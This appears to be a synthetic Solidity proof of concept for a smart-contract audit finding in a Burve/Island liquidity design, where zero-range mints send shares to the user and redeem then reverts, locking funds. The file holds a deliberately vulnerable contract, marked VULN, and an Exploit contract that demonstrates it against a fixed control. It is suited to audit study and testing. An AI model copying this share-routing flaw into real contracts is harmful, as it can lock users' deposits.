// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Burve island mint — shares go to the user, redeem burns the Burve (Pashov, 55214)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: the zero tick range mints island shares to `recipient` instead of
    address(this). redeem burns the Burve, which holds none, so N underlying
    cannot be withdrawn. The control mints to address(this) and redeem pays N. */

contract MockERC20 {
    string public name = "Underlying";
    string public symbol = "UND";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Island {
    MockERC20 public underlying;
    mapping(address => uint256) public balanceOf;

    constructor(MockERC20 u) {
        underlying = u;
    }

    function mint(uint256 shares, address to) external {
        underlying.transferFrom(msg.sender, address(this), shares);
        balanceOf[to] += shares;
    }

    function burn(address from, uint256 shares) external {
        require(balanceOf[from] >= shares, "shares");
        balanceOf[from] -= shares;
        underlying.transfer(msg.sender, shares);
    }
}

contract Burve {
    struct Range {
        int24 lower;
        int24 upper;
    }

    Island public island;
    MockERC20 public underlying;
    bool public immutable mintToSelf;
    mapping(address => uint256) public burveShares;

    constructor(Island isle, bool toSelf) {
        island = isle;
        underlying = isle.underlying();
        mintToSelf = toSelf;
    }

    function mint(Range memory range, uint256 liq, address recipient) external {
        underlying.transferFrom(msg.sender, address(this), liq);
        underlying.approve(address(island), liq);
        if (range.lower == 0 && range.upper == 0) {
            uint256 mintShares = liq;
            address shareTo = mintToSelf ? address(this) : recipient;
            // @> VULN: island shares are minted to the user; redeem burns this contract, which has none
            island.mint(mintShares, shareTo);
        } else {
            island.mint(liq, address(this));
        }
        burveShares[recipient] += liq;
    }

    function redeem(uint256 shares) external {
        island.burn(address(this), shares);
        underlying.transfer(msg.sender, shares);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    MockERC20 public underlying; // nonce 1
    Island public island; // nonce 2
    Burve public burve; // nonce 3
    Island public controlIsland; // nonce 4
    Burve public control; // nonce 5

    uint256 public stuck;
    bool public redeemReverted;
    uint256 public userShares;
    uint256 public controlPaid;

    constructor() {
        underlying = new MockERC20();
        island = new Island(underlying);
        burve = new Burve(island, false);
        controlIsland = new Island(underlying);
        control = new Burve(controlIsland, true);
        underlying.mint(address(this), N * 2);
    }

    function run() external {
        Burve.Range memory range = Burve.Range({lower: 0, upper: 0});
        underlying.approve(address(burve), N);
        burve.mint(range, N, address(this));
        userShares = island.balanceOf(address(this));
        require(userShares == N, "shares went to the user");
        require(island.balanceOf(address(burve)) == 0, "burve has no shares");
        try burve.redeem(N) {
            revert("redeemed");
        } catch {
            redeemReverted = true;
        }
        stuck = underlying.balanceOf(address(island));
        require(redeemReverted, "not reverted");
        require(stuck == N, "N not stuck");

        underlying.approve(address(control), N);
        control.mint(range, N, address(this));
        require(controlIsland.balanceOf(address(control)) == N, "control holds shares");
        control.redeem(N);
        controlPaid = N;
        require(underlying.balanceOf(address(this)) == N, "control paid N");
        require(underlying.balanceOf(address(controlIsland)) == 0, "control island empty");
    }
}
